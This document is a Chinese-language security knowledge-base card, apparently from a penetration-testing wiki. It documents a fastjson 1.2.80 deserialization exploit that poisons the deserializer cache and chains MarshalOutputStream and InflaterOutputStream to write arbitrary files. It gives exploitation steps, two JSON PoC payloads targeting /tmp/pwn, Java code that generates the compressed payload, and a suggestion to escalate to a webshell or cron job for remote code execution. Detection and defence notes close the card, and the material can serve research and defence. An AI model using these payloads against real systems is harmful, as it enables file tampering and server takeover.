---
id: web-java-deser-fastjson-1280-outputstream-cache-file-write
title: Fastjson 1.2.80 Throwable 思路缓存 OutputStream 类型：JSONGenerator 链 + MarshalOutputStream/InflaterOutputStream 触发目标流写入
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-1280-outputstream-cache-write
aliases:
- fastjson 1.2.80 写文件
- UTF8JsonGenerator 缓存 OutputStream
- JsonGenerationException 期望类
- MarshalOutputStream 写流
- InflaterOutputStream 解压写文件
- CVE-2022-25845 变体
tags:
- java
- fastjson
- deserialization
- autotype
- throwable
- cache-poisoning
- jackson
- outputstream
- file-write
cve:
- CVE-2022-25845
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: fastjson 1.2.80
verification:
  verified_by: verifier-T1-24
  verified_at: '2026-11-08T13:36:02+08:00'
  notes: 已对照原文核对：fastjson 1.2.80+Jackson2.13.2依赖(图01 BOOT-INF/lib)支撑；两段式payload(Exception→JsonGenerationException→JsonGenerator→OutputStream缓存→MarshalOutputStream+InflaterOutputStream→FilterFileOutputStream写文件)与原文一致；affected_versions=fastjson 1.2.80为原文明确；dedup_review对exception-deserializer-cache-bypass的第二段gadget/依赖差异成立；卡按任意文件写定位、未包装成RCE，MarshalOutputStream触发点存疑已标注，处理合理；计算器SSTI skip合并到web-python-ssti-jinja2-subclasses-index-rce成立；卡无sources字段；未验证点：PoC未在本地执行
---

## 一句话结论

Fastjson 1.2.80 关闭 AutoType 时，先用 `java.lang.Exception` 作期望类 + 一个 Throwable 子类（Jackson 的 `JsonGenerationException`）把 `OutputStream` 相关的类塞进 `ParserConfig` 的反序列化器缓存，第二段即可用缓存类型作 `@type` 加载 `UTF8JsonGenerator`，再用 `sun.rmi.server.MarshalOutputStream` 包 `java.util.zip.InflaterOutputStream` 包目标 `OutputStream` 子类，在构造/初始化时把解压后的字节写入该流，形成任意文件写。

## 原理

**第一段：投毒缓存。** 1.2.80 的 `checkAutoType` 在黑白名单判断前先查 `TypeUtils.getClassFromMapping` / `deserializers.findClass`，命中缓存就不再拦。`{"@type":"java.lang.Exception","@type":"<Throwable 子类>","<field>":{}}` 中第一个 `@type` 是期望类，第二个是实际类型（必须是 Exception 子类才通过 `isAssignableFrom`）；进入 `ThrowableDeserializer` 后遍历剩余字段，`value` 是 `{}`（JSONObject）与字段声明类型不符，于是走 `TypeUtils.cast(value, fieldInfo.fieldType, config)`，`cast` 内部调用 `config.getDeserializer(fieldType)` 并把「字段类型 → 反序列化器」写入 `deserializers` 缓存。选 Jackson 的 `JsonGenerationException`（字段 `g` 声明为 `JsonGenerator`）就顺手把 `JsonGenerator` 及其子类路径缓存进来。

**第二段：加载 OutputStream 链。** 缓存命中后 `{"@type":"com.fasterxml.jackson.core.JsonGenerator","@type":"com.fasterxml.jackson.core.json.UTF8JsonGenerator","out":{...}}` 可正常实例化，`out` 字段类型是 `java.io.OutputStream`。此时再把 `out` 填成 `sun.rmi.server.MarshalOutputStream`，其 `out` 字段填 `java.util.zip.InflaterOutputStream`，后者 `out` 填目标应用里可被 `@type` 实例化的 `OutputStream` 子类（本例是靶场自带的 `FileOutputStream` 子类，构造时 `super(name)` 直接打开/创建文件），`infl.input.array` 放压缩后的字节、`limit` 放解压后长度。

**为什么写盘成立：** `MarshalOutputStream` 是 `ObjectOutputStream` 的子类，初始化时会向底层流传流头字节；`InflaterOutputStream.write()` 收到字节后按 `infl` 解压并写进它包装的 `out`。于是「写流头」这个副动作被复用成「把攻击者提供的压缩内容解压后写入任意路径」，全程不需要目标提供反序列化 sink 之外的能力，也不需要出网。

## 触发条件

- fastjson 1.2.80 且 SafeMode 关闭，存在把不可信 JSON 交给 `JSON.parse`/`parseObject` 的入口；
- 同一 JVM 可连发两段请求（缓存跨请求保留），或两段可合并进同一份 JSON（`$ref` 引用）；
- classpath 有 jackson-core（提供 `JsonGenerationException`/`JsonGenerator`/`UTF8JsonGenerator`）；
- 目标侧存在「继承 `OutputStream`、构造或 setter 里就打开文件」的类，且该类可被 `@type` 加载（否则只能写到 `FileOutputStream` 已白名单的情况）；
- 写文件本身不等于 RCE，需要落地点（计划任务、JSP、启动脚本等）配合。

## 利用步骤

1. 探测 AutoType 与版本：`{"@type":"java.lang.Exception","detailMessage":"x"}` 有正常回显说明 Exception 期望类路径可用；再确认依赖中存在 jackson-core。
2. 发第一段投毒：`{"a":"{\"@type\":\"java.lang.Exception\",\"@type\":\"com.fasterxml.jackson.core.JsonGenerationException\",\"g\":{}}","b":{"$ref":"$.a.a"}}`，观察是否解析成功（返回原串、无 autoType error 即命中）。
3. 发第二段：用 `JsonGenerator` + `UTF8JsonGenerator` 作双层 `@type`，`out` 里嵌套 `MarshalOutputStream` → `InflaterOutputStream` → 目标 `OutputStream` 子类，`infl.input.array` 填压缩数据的 Base64、`limit` 填解压长度。
4. 用压缩工具生成本地内容：`DeflaterOutputStream` 压缩 → Base64，记录压缩串与解压长度。
5. 校验写入（读文件、访问落地点），再按需换成 webshell/计划任务内容完成 RCE。

## PoC

第一段（缓存 `JsonGenerator`，`$ref` 仅为回显引用）：

```json
{
  "a": "{ \"@type\": \"java.lang.Exception\", \"@type\": \"com.fasterxml.jackson.core.JsonGenerationException\", \"g\": {} }",
  "b": { "$ref": "$.a.a" },
  "c": "{ \"@type\": \"com.fasterxml.jackson.core.JsonGenerator\", \"@type\": \"com.fasterxml.jackson.core.json.UTF8JsonGenerator\", \"out\": {} }",
  "d": { "$ref": "$.c.c" }
}
```

第二段（写文件骨架，`<B64>`/`<LEN>` 需按实际内容生成）：

```json
{
  "@type": "java.io.OutputStream",
  "@type": "sun.rmi.server.MarshalOutputStream",
  "out": {
    "@type": "java.util.zip.InflaterOutputStream",
    "out": {
      "@type": "com.example.ChallengeFileOutputStream",
      "name": "/tmp/pwn",
      "prefix": "/"
    },
    "infl": {
      "input": {
        "array": "<B64>",
        "limit": "<LEN>"
      }
    },
    "bufLen": "100"
  },
  "protocolVersion": 1
}
```

生成 `<B64>` 的最小 Java 片段：

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
try (DeflaterOutputStream d = new DeflaterOutputStream(bos)) { d.write("content".getBytes("UTF-8")); }
String b64 = Base64.getEncoder().encodeToString(bos.toByteArray());
```

无通用 PoC：第二段的 `FileOutputStream` 子类是靶场自定义类，真实目标需要自行寻找可 `@type` 实例化且会打开文件的 `OutputStream` 子类。

## 变体与关联

- 第一段 Throwable 子类可换：`InputCoercionException`（字段 `p` → `JsonParser`，缓存 InputStream 方向）、Groovy `CompilationFailedException`（`unit` → `ProcessingUnit`）、Jython `ParseException`。
- 第二段写入侧可换：任何「`OutputStream` 子类 + 构造/setter 打开文件」的类；`InflaterOutputStream` 也可换成其它在写入时产生副作用的流包装类。
- 关联：[[web-java-deser-fastjson-1280-exception-deserializer-cache-bypass]]（同一缓存投毒机制，走 Groovy/Jackson InputStream/commons-io 方向）；[[web-java-deser-fastjson-file-write-to-rce]]（写文件后的落地点选择）；CVE 记录见 `cve/fastjson.md`。
- 机制存疑点：原文表述为「`MarshalOutputStream.readObject()` 触发底层 `write`」，从 JDK 实现看更像是 `ObjectOutputStream` 初始化写流头即触发，两种路径的观测结果一致，但不影响「流包装 + 解压写入」的结论。

## 检测与防御

- 检测：单次或连续请求出现两个 `@type` 叠在同一对象内的 `java.lang.Exception` + Throwable 子类 + `{}` 字段；随后出现 `JsonGenerator`、`UTF8JsonGenerator`、`MarshalOutputStream`、`InflaterOutputStream`、`sun.rmi.server`、`java.util.zip` 等类名；`@type` 指向应用自定义 `OutputStream` 子类。
- 检测：进程异常创建/覆盖非预期路径文件（`/tmp`、Web 目录、计划任务目录）。
- 防御：升级 fastjson 至修复版本或开启 SafeMode；`ParserConfig` 显式 accept 白名单而非依赖 AutoType 关闭；业务侧不要提供「构造即打开文件」的 `OutputStream` 子类；限制进程对敏感目录的写权限。
